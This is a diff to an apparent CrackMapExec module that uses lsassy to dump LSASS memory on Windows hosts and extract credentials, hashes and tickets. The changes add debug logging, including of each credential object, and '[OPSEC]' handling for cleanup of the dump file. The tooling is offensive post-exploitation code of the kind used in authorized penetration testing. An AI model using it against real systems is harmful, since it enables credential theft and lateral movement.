@@ -5,12 +5,13 @@
 # Website:
 #  https://beta.hackndo.com [FR]
 #  https://en.hackndo.com [EN]
+import logging
+
 from lsassy.dumper import Dumper
 from lsassy.parser import Parser
 from lsassy.session import Session
 from lsassy.impacketfile import ImpacketFile
 from cme.helpers.bloodhound import add_user_bh
-import logging
 
 
 class CMEModule:
@@ -34,12 +35,6 @@ class CMEModule:
             self.method = module_options['METHOD']
 
     def on_admin_login(self, context, connection):
-        # lsassy uses a custom "success" level, which requires initializing its logger or an error will be thrown
-        # lsassy also removes all other handlers and overwrites the formatter which is bad for us (we want ours)
-        # so what we do is define "success" as a logging level, then do nothing with the output
-        logging.addLevelName(25, 'SUCCESS')
-        setattr(logging, 'success', lambda message, *args: ())
-
         host = connection.host
         domain_name = connection.domain
         username = connection.username
@@ -80,16 +75,37 @@ class CMEModule:
         credentials, tickets, masterkeys = parsed
 
         file.close()
-        ImpacketFile.delete(session, file.get_file_path())
+        context.log.debug(f"Closed dumper file")
+        file_path = file.get_file_path()
+        context.log.debug(f"File path: {file_path}")
+        try:
+            deleted_file = ImpacketFile.delete(session, file_path)
+            if deleted_file:
+                context.log.debug(f"Deleted dumper file")
+            else:
+                context.log.fail(f"[OPSEC] No exception, but failed to delete file: {file_path}")
+        except Exception as e:
+            context.log.fail(f"[OPSEC] Error deleting temporary lsassy dumper file {file_path}: {e}")
+
         if credentials is None:
             credentials = []
+
+        for cred in credentials:
+            c = cred.get_object()
+            context.log.debug(f"Cred: {c}")
+
         credentials = [cred.get_object() for cred in credentials if cred.ticket is None and cred.masterkey is None and not cred.get_username().endswith("$")]
         credentials_unique = []
         credentials_output = []
+        context.log.debug(f"Credentials: {credentials}")
+
         for cred in credentials:
+            context.log.debug(f"Credential: {cred}")
             if [cred["domain"], cred["username"], cred["password"], cred["lmhash"], cred["nthash"]] not in credentials_unique:
                 credentials_unique.append([cred["domain"], cred["username"], cred["password"], cred["lmhash"], cred["nthash"]])
                 credentials_output.append(cred)
+
+        context.log.debug(f"Calling process_credentials")
         self.process_credentials(context, connection, credentials_output)
 
     def process_credentials(self, context, connection, credentials):
@@ -108,6 +124,7 @@ class CMEModule:
 
     @staticmethod
     def print_credentials(context, domain, username, password, lmhash, nthash):
+        context.log.debug(f"Inside print_credentials")
         if password is None:
             password = ':'.join(h for h in [lmhash, nthash] if h is not None)
         output = "%s\\%s %s" % (domain, username, password)
